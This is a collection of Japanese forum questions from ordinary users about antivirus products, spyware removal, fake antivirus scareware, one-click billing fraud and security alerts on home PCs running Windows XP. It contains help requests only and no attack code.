1と3を先にアンインストールしたら、2もアンインストールできるんですか？それとも私はもっと広い範囲のサービスを受けているのでしょうか？そのサービスはどこで見つかりますか？(パソコンをリカバリしたばかりで、なんにも受けていないと思いますが・・・) 変な質問かもしれませんが、要するに、McAfee全体をパソコンからアンインストールする方法を教えていただきたいです。 よろしくお願いします。
無線LANパトロール中に見つかった信頼済みでない、機器をブロックできないで困っています。 トレンドマイクロ　ウイルスバスター使用、 常に最新版に自動アップデートしています。 ネット環境： J-COM@NetHome 無線LANパトロールを有効に設定しています。 困っていることは、 頻繁に、下記のウイルスバスターのダイアログが表示されるようになり、ブロックできないこと。 【信頼済みでないコンピュータ／機器が、ネットワークに接続されています。 見つかったコンピュータ／機器のプロパティを確認してください。】 ☆プロパティを確認すると、 【このIPアドレスを持つコンピュータ／機器からのアクセスが 無線ランパトロール中に見つかったコンピュータ／ネットワーク機器からの情報を取得しました。】 信頼状況未設定 IPアドレス192.168.1.1 コンピュータ名----- MACアドレス00:0a:79:46:8a:22 種類ルータ 下記のメッセージが表示されました。 【例外ルールを追加する】をクリックすると、 このIPアドレスを持つコンピュータ／機器からアクセスが常にブロックされるようになります。 ☆例外ルールを追加し、ＯＫ。 下記のメッセージが表示されました。 【新しい例外ルールに追加されました。】 例外ルールを追加、設定するも、相変わらず、表示されます。 表示されないようするには、どうすればいいでしょうか？ どうぞよろしくお願いいたします。
最近パソコンが遅くなっています。ウイルスバスターでチェックしていますが感染はないようです。 タスクマネージャーで見ると　mpcmgr.exe　というファイルが動いているようなのですがこれはスパイウェアなのでしょうか？ パソコンに詳しくないので教えてください。
光ケーブルで常時ネット接続の環境なので、ZoneAlarm ForceFieldを使用してみようかと思っています。 ただ、ネットで検索してみたら、ブラウザが重くなるだけで効果を実感できないという書き込みもあり、ためらっているところです。 そこで、すでにご使用の方にうかがいたいのですが、Pentium4, 2.6GHz、メモリ１GB程度のスペックでもストレスなく使えるものでしょうか。 また、下記のセキュリティ・ソフトを使用していますが、バッティングの怖れはありませんか。 Ad-Aware 2008 A-Squared free COMODO Firewall Pro（常駐） Dr. Web Link Checker（常駐） McAfee SiteAdvisor（常駐） NOD32 V3 NoScript 1.8（常駐） Redirect Remover 2.5.5（常駐） Spybot S&D 1.6（Tea-Timer不使用） SpywareBlaster（常駐） SpywareTerminator（常駐） SUPERAntiSpyware OSはXP Pro SP3です。よろしくお願いします。
spybot1.5.2で、日本語のアップデートが出てこないのですが、何かおかしいのでしょうか？他国語のは毎日見るのですが全く出てこないです。。。
『コントロールパネル』の『ユーザーとパスワード』をのぞいて見ると、謎の『Guest』とユーザー名の欄にありました。『削除』をクリックしても削除できませんでした。その時「ユーザーD76DQ21X\Guestを削除できませんでした」の表示が出ました。次に『コマンドプロンプト』で「net user D76DQ21X/delete」として削除しましたが、依然として『ユーザーとパスワード』では謎のユーザーが存在して削除できません。どうしたら削除できますでしょうか、ご助言お願いします。
先ほどWinAntiVirusを踏んでしまいました。 色々調べてみると何やら詐欺紛いのような物らしいではないですか！？ WinAntiVirusを踏んだ時勝手にウイルススキャンのような画面が出てきてその後勝手にダウンロードが開始されたのでおかしいと思い途中でキャンセルしたんです。その後スーパーアンチスパイウェアで削除したのですが一つどうしても心配な事が・・・ 別のサイトでWinAntiVirusについて書かれていたのですが「クレジットカードで代金を支払ってしまった」「登録してしまった」というのを目にしたのですが私の画面にはクレジットカードの番号を記入する画面は出てきませんでした。 途中で放置してすぐに削除したのが良かったのか又はこれから家の方にまで請求がくるのかとても気になります。 宜しくお願いします。
それぞれのパソコンにXPSP3で 1台はNorton Internet Security2008 もう1台はKaspersky Internet Security2009をインストールしていますが スパイ対策ソフトは、何を使用すればよいでしょうか？ 相性などはありますか？ スパイ対策ソフトを沢山入れている方もいますが、1つでよいでしょうか？
Norton Inetnet Security 2009体験版を使っています。 Mozilla Thunderbirdでメールを受信すると件名が意味不明な文字列に変わってしまいます。 例 「=?ISO-2022- JP?B?W05vcnRvbiBBbnRpU3BhbV0gGyRCQTQkNEVQTz8lZiE8JTYhPCROMydNTSRYGyhC IBskQiEnGyhCIDExGyRCN24bKEI3GyRCRnxIL0dkISE/N0A9SUokTiQ0MEZGYhsoQg=?=」 （改行してありますが、一続きの文字列です。） 中には正しく件名が表示されるものもあれば、されれないものもあって、 Nortonの設定の問題なのか、Mozilla Thunderbirdの設定の問題なのか困っています。どなたか解決策をご存知ありませんか？
こんにちわ。 先日、スパイウェアにかかってしまい、赤いバルーンやネットサイトのショートカットが削除しても出てくる症状や、IEでスパイウェア除去サイトやトップページが開けなくなったり、PC動作が遅くなるような複合的な症状が出ました。 それに対しての経緯ですが、 ・システムの復元　→　復元失敗 ・Malwarebytes' Anti-Malware　→　トロイの木馬、マルウェア、スパイウェアの削除 ・Spybot　→　Malwarebytes' Anti-Malwareで削除できなかった？スパイウェアやマルウェア等の除去 を行いました。 ここまでの作業で、はじめに書いた不具合は解消されました。 このあと、セーフモードでまだ削除してないので眠ったままのスパイウェア等があると思い、Malwarebytes' Anti-Malwareで再度スキャンしました。 そこで６つか７つぐらいTrojianが出てきました。 ここでは、備考の部分にNo action takenと書いてありましたが、部類がTrojianになっていたので、全部削除してしまったところ、また不具合が発生してしまいました。 ・ローカルディスクCやDなどにマイコンピュータからアクセスできなくなってしまいました。 　『resycle\boot Win32は有効なプログラムではありません。』 　のような知らせがでます。ですが、右クリック→エクスプローラからアクセスすることはできるので、一応使えますが、以前と違う不具合です。 ・PC動作が遅くなり、またスパイウェア駆除サイトなどページ制限がかかってしまいました。 　一つ目の不具合は、ローカルディスクにアクセスする何かを削除してしまったのが原因ではないかなと思うのですが、二つ目については検討がつきません。 このような状況の場合どのようにしたらよろしいでしょうか？ 皆様のアドバイスをいただければと思います。 よろしくお願い致します。
SPYBOTの常駐が効かなくなってしまいました。 常駐が無効になってるのかと思い、 ツール→Resident→Tea Timer を確認しましたが、 ちゃんとチェックボックスがONになっています。 ON/OFF再起動を繰り返しましたが、常駐のバーに帰ってきません。 いままでこんな事はなかったので困っています。 よろしくお願いします。
こんにちは。 現在、北京におります。中国語のサイトを閲覧しているわけではないのですが、突然QQというチャットソフト（？）の ペンギン広告が画面に現れるようになりました。ちょうどメッセンジャーのオンライン通知ぐらいの大きさで画面の右下に現れます。 友達に相談したところ、スパイウェアドクターを勧められインストールしてみました。 「駆除に成功しました！」というメッセージが出たので安心していたのですが、 スキャンした直後にまたペンギンが現れたり、 ペンギンが画面上に出るのにスキャンしてもスパイウエアが検出されなかったりしています。 こちらでスパイウェアドクターは日本で評判がよくないという話を読んだので、 カスペルスキーのオンラインスキャンをしようとしましたが、何度やってもスキャンが終わりません。 スキャン開始から1時間分以上経っても数パーセントしかスキャンされていなかったり、途中で止まってしまいます。 インターネットの接続時間に制限があるためカスペルスキーは断念し、 スパイボットをインストールしてスキャンしてみました。アップデートしてからスキャンを開始したのですが結果は 「あめでとう！スパイウェアは検出されませんでした！」との事。。。 でも不定期にペンギンが画面に現れ、見る度に殺意を覚えます。 スパイウェアが原因ではないのでしょうか？ どなたか詳しい方、考えられる原因と対策を教えて頂けませんか？　宜しくお願い致します。 ウイルス対策ソフトはavastを入れています。
ワンクリック詐欺にあっています。どうしたら初期画面に出てくる督促を削除できますか。その方法を教えてください。よろしくお願い
初心者です。 ネットカフェのような公共のパソコンで、パスワードを入力しログインして、 その後きちんとログアウトしても、 後からそのパソコンを使う第三者に、入力したパスワードを読み取られる、ということがあり得るでしょうか？ 近々、公共のパソコンを利用する可能性があるため心配です。 よろしくお願いします。
OEを使っています。 最近OEを立ち上げると毎日のように開封要求してくるメールがきています。 開封してみると全く何も書かれていなく書いてあるのも送信テストと書かれているだけです。 ただファイルが添付されており気味悪いです。 いまのところファイルを開けたことはないのですが、メールを開封しただけでウィルスに感染してしまうことってあるのでしょうか？ このようなメールが頻繁に届くようになり全てのメールをgmailに転送してそちらで見るようにしました。 これって少しはセキュリティー上有効でしょうか？ アドバイス宜しくお願いします。
最近、ウィルスソフトを更新しました。 ウィルスチェックをしたところ、驚くほどたくさんのウィルスやスパイウェアに感染していました。 それからマメにウィルスチェックをしているのですが、毎回必ず新たに感染しています。 やはり、インターネットを利用する事で感染してしまうのでしょうか？ とりあえず、今のところ大きな実害はないようですが(とは言うものの しばしばパソコンがフリーズしたり、画面の表示がおかしくなったりします・・・） ネットバンキングやネットショッピングを利用しているため心配です。 感染を防ぐために有効な対策をお教えいただけないでしょうか。 よろしくお願いいたしますm(_ _)m ※ちなみによく感染しているスパイウェアやウィルスは以下のものです。 ・スパイウェア *Cookie_DoubleClick *Cookie_ServingSys *Cookie_Revsci等・・・Cookie_から始まるもの ・ウィルス *TROJ_GAMETHIE.DU *TROJ_GAMETHIEF.M *TSPY_ONLINE.DU *TSPY_LINEAGE.BFQ等
インターネットバンキングについての初歩的な疑問です。 もしも自分のパソコンが何らかのウイルスに感染していたり スパイウェアに入り込まれているなどして、 その結果、口座番号や暗証番号が外部に漏れて、 自分の預金口座のお金が、勝手に第三者の口座に送金されてしまう、 と言った危険性はないものですか？ 利用者の環境が原因で事故が発生する可能性を 銀行側は考慮しているのでしょうか？ ネットバンキングの信頼性は如何なものなのですか？
先日PCがウィルスに感染し、焦った勢いで友人に薦められたまま米国ENIGMA社のSPYHUNTERをネットで購入しました。 後にネットで検索したところ、結構怪しいソフトのようで、今後どうしたらよいか困っています。 最初の購入以外にも、不当な請求が続けてくることなどあるのでしょうか？？ またどうしたらとめられるのでしょうか？？
勤務先の出来事なのですが・・・ ネットセキュリティソリューション会社とやらの営業の方がみえられ、 「スパイウェアがたくさん検出された。 このままではパソコンに影響が悪いので対策が必要。」 と、月額20，000円・5年リースの「ルーター」のようなものを 勧められました。 現在使用してるモデム＆ルーターとその機械を交換すると、 その機械の部分がスパイウェアの侵入を防ぐ、というものです。 今まで、某プロバイダの24時間チェックシステム（月額300円程度）を 使用していましたが、「それでは検出しきれなかったものが多数ある。」と。 実際、ソフトを使い、検出作業をしていました。 一台のパソコンから150個ほど検出したとのことなのですが、 そのソフトがあのSpyware Doctorだったのです。 もちろんその場でスパイウェアを駆除してくれるわけではなく、 その機器を導入したら駆除を一緒に行うとのこと。 パソコン3台使用の、本当に小さい会社なのですが 100万近くの機器は必要なのでしょうか・・・ 検出に使ったソフトがSpyware Doctorというのも気になります。 明日、返事をすることになっているので困っています。
勤務先の出来事なのですが・・・ ネットワーク・セキュリティソリューション会社の方が来社し、 「スパイウェアがたくさん検出された。 このままではパソコンに影響が悪いので対策が必要。」 と、月額20，000円・5年リースの「ルーター」のようなものを 導入したほうがいい、と勧められました。 現在使用してる光電話のモデムとその機械を交換すると、 その機械の部分がスパイウェアの侵入を防ぐ、というものです。 今まで、某プロバイダの24時間チェックシステム（月額300円程度）を 使用していましたが、「それでは検出しきれなかったものが 多数ある。」と。 実際、何かソフトを使い、検出作業をしていました。 一台のパソコンから150個ほど検出したとのことなのですが、 どの程度のレベルのものなのか、何の検索ソフトなのか、を 確認することが出来ませんでした。 その場で、スパイウェアを駆除してくれるわけではなく、 その「ルーター」のようなものを導入したら駆除を一緒に行う とのこと。 シロウト考えでは、もっと強力（？）なスパイウェア駆除ソフトを 一台づつに入れればいいんじゃないか？と思いましたが、 「ソフトでは対応しきれないものもパソコンに入る前に シャットアウトできるので、企業では必要。」とのこと。 本当に「ソフトより確実にシャットアウト＆駆除できる」もの なのでしょうか？ ご存知の方いらっしゃいますか？
“縮専”というフリーソフトについて 会社の工事写真などの資料をメールに添付するとき、なかなか容量がかさんで難しい場合があります。 そんなときに利用できると聞いてダウンロードしたのですが、 客先にセキュリティにうるさいところもあり、Winnyなど変換ファイルと同じような影響がないか心配です。 でも先ほど“P2Pチェッカー”で検索しましたが、問題は検出されませんでした。 縮専に関しては特に心配はないとみてよいですか? http://i-section.net/software/shukusen/
こんにちわ。 パソコンの不具合があり、自分で対応してみたのですがうまく状態復帰できなかったので投稿しました。 先日、ダウンロードした曲が聴けず、Windouws Mediaplayerのエラーからコーデックをダウンロードするページに行ってダウンロード＆インストールを行いました。ファイル名は（sexvid.exeだったと思います） ・その後、 「インジケータにあなたのPCはスパイウェアに汚染されています。」「PCの速度が落ちています。感染の疑いがあります」 「SMTPが探知されました」 などの英文がポップアップで断続的に出てきます。そのポップアップをクリックするとRapid AntiVirusというソフトみたいのが勝手にスキャンしだして、その結果が画面に出てきます。 怪しいのでそれは無視してそのソフトを終了しました。 ・この不具合とは別に、アダルトサイトのショートカットキーがAll userのデスクトップに出てくるようになり、削除しても何度も出てきます。 ・あとPCが重くメモリーを食ってるみたいですが、タスクマネージャーを見て、消費量が多いプロセスを終了すればよいのですが、どれも違うような気がします。 スパイウェアとのことで、その削除ソフトをダウンロードしようとしたのですが、いつものIEショートカットキーでは起動が遅く、削除しても出てくるアダルトサイトのショートカットキーで起動した画面でならネット検索ができる状態です。 いくつか駆除ソフトを見つけて駆除を試みた結果、トロイの木馬や偽スパイウェア探知ソフトのプログラムを発見し削除したのですが、依然として上記３つの不具合が直りません。 使用してみた駆除ソフトは、AD-Aware SE、X-cleanerです。 スパイポッドのサイトはページが表示できませんと出てダウンロードできないので、友人のPCからDLして試してみようと思うのですが、この後どのように対処、駆除したらよいのか行き詰ってしまいました。 長文になってしまいましたが、 この後どのようにすればよいか、アドバイスを頂きたく思います。 よろしくお願いいたします。
最近この欄で、PCのセキュリティを強化する為に、ZoneAlarm ForceFieldと言う仮想ブラウザの使用を推薦する意見を目にします。 仮想ブラウザと言うものは、仮の画面を自分のPCで見る言う事だと多分思うのですが、導入した場合、以下教えて下さい。 (1)　これを導入してもPCの動きは従来と全く変わりませんか。（重くなることはありませんか。） (2)　PCを使うにあたり見た目に従来と違うことをありますか。PCの操作は全く従来と同じですか。 (3)　セキュリティソフトで現在KASPERSKY INTERNET SECURITY 7.0を使用していますが、競合することはありませんか。（この質問自体がおかしいかも知れませんが） (4)　その他スパイウェア対策ソフトとしてAD-AWARE2007とSPYBOT1.6.0を入れていますが、これも問題ありませんか。 (5)　もし上記の心配が無いのであれば、ZoneAlarm ForceFieldを入れる事はプラスでこそあれマイナスの要素は全く無いと思われますが、その了解でいいでしょうか。 (6)　WORD等の作業をして保存した場合にも問題なく自分のPCに保存されていますか。 (7)　今日はZoneAlarm ForceFieldを使い、明日は使わないと言う切り替えは問題ありませんか。 当方PCでバンキングなどをしますので、導入したいと思っておりますが、上記が気がかりです。（KIS7.0だけでも今までバンキングなどの問題起こったことはありませんが） 質問が多く恐縮ですが、一つでもご回答頂ければありがたいです。またもし他に似たような良いソフトがあれば教えて下さい。 ちなみに私のPCはWINDOWS XP SP3 メモリー512MBです。 よろしくお願いします。
スパイウェアドクター（アンチウィルス付き）の件で困っています。パソコンの電源が入らず修理に出しました。修理をしリカバリーをかけた状態で戻ってきたのですが、スパイウェアドクター（アンチウィルス付き）をインストールしてもアップデートがかかりません。その為、ウィルス対策ができていない状態も怖いので、復活するまでは、AVGのフリーソフトで対応しています。修理に出す前にもこれを使用しておりましたが、全く不具合もなく使用できていたのに、リカバリーがかかり、壊れていたシステムソフトも初期段階に戻ったのに何故使用できなくなったのでしょうか？パソコンメーカーも原因がわかりませんので対応できませんと言うし。デイトレやネットバンキングなどを使うので、入っていないのは怖すぎて、戻ってきてもパソコンを使えないでいます。どなたかお教え下さい(ToT)/~~~
ウイルスバスター2008から2009にバージョンアップしました。 アップデートして、ウイルスバスターを最新の状態にしても「Windowsセキュリティの緊急警告」が表示されマルウェア対策の部分が「ウイルスバスター2009は最新の状態じゃない可能性があります」となっています。 ウイルスバスターでは全ての機能が有効になっているのですが、これはどちらの表示が正しいのでしょうか？ 教えて頂けると助かります。
いつもお世話になっています。 カテゴリが適切かどうか分かりませんが、質問させてください。 管理者がウイルスに感染した状態でサイト運営を行うと、閲覧者がそのウイルスに二次感染する恐れがある、という話を聞いたのですが、これはスパイウェアについても同様なのでしょうか？ また、ウイルス・スパイウェア検索で何も引っかからなければ、それらには感染していないと考えていいのでしょうか？ 一応調べてはみたのですが、検索の仕方が悪いようで、探しても答えが見つかりません… 初心的な質問ですが、詳しい方がいらっしゃいましたら、回答よろしくお願いします。
カテゴリーに「迷惑メール」の分類がないのでここで質問させていただきます。 ウィルスバスター2009でOutlook Expressのユーザーを切り替えると、「迷惑メール対策ツールバー」が消えてしまいます。 WindowsXP Professionalをを使っていますが同一プロバイダーで3個、別のプロバイダーで2個、合計5個のメールアドレスを使っています。 メインのアドレスでは「迷惑メールツールバー」が出ていますが、他のアドレスにユーザー切り替えをしますと「迷惑メールツールバー」は出なくて大量の迷惑メール、詐欺メール等の登録が出来なくて困っています。 今30日試用版ですが、これが出来なければ本採用には二の足を踏んでいます。教えて下さい。
ウィルスバスター2008で検索をかけると毎日のようにスパイウェアが出てきます。 Cookie_Overtrue Cookie_DoubleClick などです。 なぜ出るのでしょうか。 また、これらは悪いものなのでしょうか。
ブログ更新中にいきなり画面が消える現象があるんですが、これはウィルスにでも感染してるんでしょうか？？？ これは他の作業中でもおきます。 ノート型に最近変えたんですが、ポインターに触れてしまうからなんでしょうかね～？？？
今日、パソコンを使用していたら、Virus Response Lab 2009というのに 感染？したみたいで、現在、パソコン画面右下のタスクバーに そのアイコンがあります。 （アイコンは赤いクロスマークと青いクエスチョンマークが点滅している状態） それをクリックすると、Virus Response Lab 2009のサイトに飛ぶようになっています。 普通にパソコンをしている時は何も障害はないんですが、 時々そのアイコンからSystem Alart!というポップアップが 何度も出てきて、落ち着いてネットが出来ません。 パソコンですが、WindowsＸＰを使っています。 このアイコンを駆除する方法はありますか？ ご教授の方、どうぞ宜しくお願いします。 【対策したこと】 （１）あらかじめ、こちらの過去ログを調べて、同一のものが無かったので 質問しました。 （２）ウイルスバスターとAd-Awereというソフトを使ってウイルス駆除しました。 （３）ウイルス駆除で最適なセーフモードで同様の作業を試しても、 全く効果がありませんでした。 （４）ネット上で同様の内容を検索したら、同じ悩みを持つ方を見つけましたが 何もしていないのに消えていたという事で、あまり参考になりませんでした。 （５）コントロールパネルから、ソフトの追加・削除で、 こちらのウイルスを検索しましたが、見つからず、 削除出来ませんでした。 （６）タスクバーの項目を見ても、同様に名前が見つからず、お手上げでした。 いろいろと自分で出来ることをネットで検索して、いろいろと試しましたが 全く効果がありませんでした。 本当に困っています。　助けてください。 皆様のご意見をお待ちしています。
ＳＰＹＷＡＲＥＤＯＣＴＯＲで感染発見　駆除の方法を教えてください 試用版なおため駆除や削除はできません。 またAD-AwareやSpydot-searchは使用しましたが、駆除出来ませんでした。 宜しくおねがいします。
フリーソフトなどでポリシーを説明して同意させ、合法的に個人情報を収集するものから、スパイとされるものまであると思います。 それぞれ仕組みは違うと思いますが、どんな仕組みなんでしょうか。 漠然としてしまうと思うので、たとえば合法で知っているのは Google http://www.　 google.co.jp/privacy.html kingsoft http://www. kingsoft.jp/privacy_is.html オプトメディア https://www.　 optmedia.jp/kiyaku/user.html cookieとその他の手段らしいのですが、 cookieならブラウザで拒否、削除出来ますがユーザーが削除出来る以外にソフト内に保存して特定のサイトやタイミングで送信してるんでしょうか。 その他の手段はどんな方法があるんでしょうか。 ツールバーなら打ち込んだ単語などを記録して送信してそうなんですが、どんなタイミングで送っているのでしょうか。 それぞれ読んだのですがよく分かりませんでした。 詳しい人ならインストールしてるソフトが今Aという情報を保存したとか、Bという情報を送信したとか分かるのでしょうか。 cookieの仕組みは調べて大体分かったのですが、ブロックや削除をまめにしていたらこれを利用出来なくなって上記ソフトなどはおかしくなるんでしょうか。 googleツールバーは別にcookieを削除しても変化しないように思います。 フォルダを覗いてもぜんぜん分かりませんでした。 他は分かりません。 素朴な疑問です。お願いします。
閲覧ありがとうございます。　タイトルの通りなのですが、機能豊富でウイルス・スパイウエアの検出力が高い、使いやすいソフトはありますか？そしてできれば軽いのがいいです。
非常にウィルス検出率が良いと評判のガスペルスキー・インターネットセキュリティの最新版を使用しようと思っているのですが、このソフトを使っている方に質問なのですが、 これ一本でスパイウェア対策も十分でしょうか。それとも他になにかスパイウェア対策ソフトを導入したほうが良いでしょうか。 あやしいサイトに行かないようにはしているのですが。よろしかったらご教授お願いします。
カスペルスキー2009を入れていますが、下記のように１日に２，３回侵入検知システムが働くのですが、怖いのでどのように対策するべきなのか教えていただけないでしょうか？ どうぞよろしくお願いします。 ■Intrusion.Win.DCOM.exploit 114.48.5.15からローカルポート: 135へのTCP ■Intrusion.Win.MSSQL.worm.Helkern　218.75.199.50からローカルポート: 1434へのUDP ■Intrusion.Win.MSSQL.worm.Helkern 61.139.54.94からローカルポート: 1434へのUDP ■Intrusion.Win.MSSQL.worm.Helkern　61.153.176.124からローカルポート: 1434へのUDP
業者からのスパムメールの中でauのものが多いように感じるのですが、どうしてですか？
先々日サイト（デジタルオーディオプレーヤーを調べていました）を見ていたところ、よく分からないアプリケーション？複数がアクセスしようとしていたのですが、その日はダウンロード作業をしていたため、それらがアクセスしようとしているのではと思い、覚えのないものではあったのですが…Nortonのファイアウォールの警告を「許可」してしまい。 その後すぐに、「ウイルスを検出したので削除しました」というような表示がNortonから出されたのですが、まだ残っているのではと不安になり、調べたところ、やはりまだ残っていたようで… 下記のサイトを参考に一応削除してみたのですが、完全に削除できているか不安で；； http://209.85.175.104/search?q=cache:Fu6yt4pfPJ4 … お力を貸して頂けると幸いです。 また、そのウイルスのアプリケーション？名は、 dflgh8jkd2q？（※？には数字が入ります） winds32.exe などです。 Norton Internet SecurityのNorton AntiUirusのレポートより、「活動ログを表示」→「ファイアウォール」で、上記サイトに記載されていた削除方法を行う前の10/18 18:25 に、そのアプリケーション？（dflgh8jkd2q？）らがアクセスしようとしています。　と表示されていたのですが、現在（削除後）は表示されていません。 そのアプリケーション？らが入っていたフォルダにも、無事削除できたのか…、今は見当たりません。 しかし、バッググラウンドは…と調べようとしたところ、タスクマネージャが開けず…下記のサイトを参考に開く事はできたのですが、そのサイトに記載されているとおり、値が（１）とセットされていたため、やはり感染してしまったのではと； ※現在は問題なく、ツールバーから表示できているのですが… http://pasofaq.jp/windows/admintools/disabletask … 当方Norton Internet Security2006を使用していて、システムの完全スキャンをしたところ問題はありませんでした。 また、Spybot（初使用です；）にてスキャンを行ったところ、いくつか検出されたので、全て削除しました。 それで、今のところ特に問題はないように思えるのですが…； また別の質問になってしまうのですが；、最近Norton Internet Security2006を起動させると「現在、管理者が設定を更新中です。お待ち下さい…」というものが度々表示されるようになったのですが、この管理者とは誰の事を指すのでしょうか；？ 先日ノートンのサポートに問い合わせたところ、「誰かが侵入しているという事はない」とご回答頂いたのですが…やはり気になりまして；； また、「2008年版に無償でアップグレード可能なので、試してみてはどうでしょうか」との事だったのですが、もう少しで期限が切れそうなので、2008年版に無償でアップグレードした後、延長キーを購入という事でいいのでしょうか；？ 長文、乱文で大変申し訳ありませんが、どうかご回答の程宜しくお願い致します。
NTTのセキュリティツールの無線LANパトロールを使っていたら 信頼済みでないコンピュータがネットワークに接続されていますと出ました みると、IPアドレスの***.***.***.***が引っかかっていました これは信頼して良いんでしょうか？ ちなみにNTTのフレッツの無線LANでノートパソコンのNECのXPを使っています。 ちなみに兄弟が他のパソコンでもインターネットをしています(無線LAN) お願いします。
WINDOWS XP（個人PC)を使ってます。Ctr＋Alt＋Delを押すと「タスクマネージャは管理者によって使用不可にされています。」というメッセージが表示されます。タスクマネージャを使用可能にするにはどうすればいいのでしょうか？ 【【[スタート] － [ファイル名を指定して実行] － [regedit] と入力して、「OK」をクリックする。レジストリエディタが起動したら、 [HKEY_Current_User \ Software \ Microsoft \ Windows \ CurrentVersion \ Policies \ System] を開く。右ウィンドウにある [DisableTaskMgr] をダブルクリックして、 [値のデータ] を「0」にする】】 のとおりにやってもまた値のデータ「1」に戻り、同じことが表示されます。LIMEWIREでDLしたソフトにPCがたぶん感染されたと思います。オンラインスキャンをしたのですが、ぜんぜん改善されません。 改善方法がなかったら、めっちゃめっちゃすごいｗ優れてるオンラインスキャンを教えてくださいｗ。 よろしくお願いします！
閲覧ありがとうございます。　タイトルの通りです。　ウイルス・スパイウエア対策ソフトを買おうと思っているのですが、ノートンインターネットセキュリティ2009とウイルスバスター2009だったらどちらがウイルス・スパイウエアの検出率が高いですか？また、フルスキャンの速度はどちらが速いですか。　回答お願いします。
Windowsの自動更新をオンにした状態でいます。 今日（10月15日）、パソコンでインターネットを使ったり、作業していたところ、更新のプログラムが入ってきたというアイコンが右下の時計の隣に出てきました（黄色い盾に「！」が入ったもの）。ウイルス対策ソフト（ソースネクストのウィルスセキュリティを使用）が反応しましたが、一括許可してインストールしました。その後自動的に再起動しました。引続きインターネットで画像を取り込んで保存しようとしたところ、マイドキュメントのフォルダの中には「マイピクチャ」「マイビデオ」などのフォルダや作成したデータがきれいサッパリ失っていました。いろいろ探してみましたが、マイドキュメント内のものは見当たりませんでした。特に重要なものは数日前にUSBメモリに入れておいたので、それだけは何とかなりそうですが、せっかく集めたものなどは返って来ません。この「更新プログラム」が実はスパイウェアか何かだったのでしょうか？もしそうだとすれば、おすすめのスパイウェア対策ソフト等がありますか？ よろしくお願いします。
ウィルスバスター2008を使用しています2009にバージョンアップ出来ますが、ＰＣにかかる負担はどうなんでしょう重くなるのなら控え様かと思うのですが教えて下さい。
本日、Antivirus2009に感染した模様。 症状； (1)立上時にAntivirus2009のメイン画面ガ出る(英語版） (2)Windowsのセキュリティーセンタ画面が出る(英語版） (3)IE7のFlashなんとかのインストールの警告出現 (4)IE7からサイト変更すると警告画面(英語） ※ブルースクリーンの症状は無し そこで次の処置をしました。 (1)maconfigにてスタートプログラムに登録されていたav2009の 　チェックを外し、再起動。 (2)progromfileフォルダー下のantivirus2009内のav2009.exeを削除 　(フォルダーごと削除し、ゴミ箱から消去） (3)システムの復元 質問： 今のところ問題無さそうなのですが、大丈夫でしょうか？ よろしくお願いします。
インターネットに接続していて、リンクに飛ぼうとすると、 res://C:\WINDOWS\system32\shdoclc.dll/syntax.htm というのがアドレスの前に入ってしまいます。 トロイの木馬に感染している…ということは分かったのですが、駆除の仕方が分かりません。 色々と調べて駆除を試みてみたのですが、上手くいかなかったので… 駆除方法を教えて頂ければ幸いです。 よろしくお願い致します。
スパイウェアに感染してしまいました。 対処の仕方とかどうしていいかわからないまま、 なんとか駆除してみようとしたんですが、 中途半端なまま画面がフリーズしてしまいました。 それで、もう1台パソコンがあるので、 パスワードなど変更したのですが、 意味ないですか？ 感染してしまったパソコンは 立ち上げるのが怖いので、 もう使うつもりはないのですが、 ちゃんと直さないとだめですか？
ネットサーフィンしていたらtrojan.win32malware1に感染しました。 PCをリカバリーしウイルスセキュリティで検査したところ １つの場所、C:\SUPPORT\TOOLS 名前がSUPPORT.CAB/bitsadmin.exe 説明、Trojan.Win32.Malware.1 に感染しています。状態が未処理 ２つ目の場所、C:\SUPPORT\TOOLS 名前、SUPPORT.CAB 説明、圧縮ファイル:1 ファイルのうち 109 ファイルが感染しています。状態が隔離 となってました。 隔離したファイルは削除しましたがPCが重く感じます。 これは削除したファイルが原因？まだ感染してるのか？と不安です・・・ どうしたらいいか解らないのでアドバイス宜しくお願いします。
SmitfraudFixの使い方 少し前からフォルダを開くと、 ------------------------------------------ Warning! ------------------------------------------ Attention, Your User Name! Some dangerous viruses detected in your system. Microsoft Windows XP files corrupted. This may lead to the destruction of important files in C:\WINDOWS. Download protection software now! Click OK to download the antispyware. (Recommended) ------------------------------------------ はい(Y) いいえ(N) ------------------------------------------ と表示されるので、SmitfraudFixで直そうと思い、ダウンロードしたのですが SmitfraudFix.cmdをダブルクリックしても一瞬だけコマンドプロントが表示されるだけであとは何も起こりません コマンドプロントには、 ----------------------------------- '.COM;.BAT;～～～～～ 操作可能なプログラム又はバッチファイルとして認識されません。 ----------------------------------- と表示されているようです(～～～は見えなかった) どうすればよいのでしょうか？
いつもつかっている医薬品検索サイトを開き、 薬品名を入力すると、その詳細が表示される サイトなのですが、薬品名を入力しエンターキーを 押すと、次のサイトへ飛んでしまいます。 http://www4.kiwi-us.com/ スパイウエアに侵入されたものと思われます。 ウイルスバスター２００８が入っているのですが、 防げなかったようです。 このスパイウエアの削除方法を教えてください。 よろしくお願いします。
Ｓｐｙ-ｂｏｔ氏にスパイウェアの検索を頼むと、たまにお客さんで Ｌｉｎｋ Ｓｙｎｅｒｇｙという変な奴を捕まえてきます。 こいつの嫌な点はメモリに介在するのでリセットオプションで再起動時にスキャンし直さないと削除できないのです。 メモリに居座るこいつは、かなりやばいものでしょうか？ 以前、フリーウェアをダウンロードした時にはバックドアウイルスという超怖い抜け道ウイルスを落としたことがありますがこれと同等？同等以上でしょうか？ 詳しい方、詳しくなくても聞いたこと・体験された方でどう対処されたか教えてください。
現在ＩＥ７　ＸＰ　ウィルスバスター２００８を使っていますが、 しょっちゅうページが開かなかったり、戻るを押しても 「インターネットサイト〇〇〇は開けません、操作を中断します」 と警告が出て開けません。 さらにはウィルスバスターの検索チェックで毎回 スパイウェアが１５個程度（除外できる）出てきます。 ＩＥ７が急にバグってしまったりと不具合が多く感じられます。 何が原因なのでしょうか？ また、解決方法をどうか教えて下さい。
Ｎorton　Ｉｎｔｅｒｎｅｔ　Ｓｅｃｕｒｉｔｙ　2008　の (1)ＩＤセーフのログイン・メモ (2)Ａｎｔｉ　Ｓｐａｍの許可リスト・遮断リスト・スパムルール のバックアップのとり方を教えてください。 　（許可リスト・遮断リストをOutlook Expressのアドレス帳にコピーしたいのですが・・・） ちなみにＰＣはＸＰです。
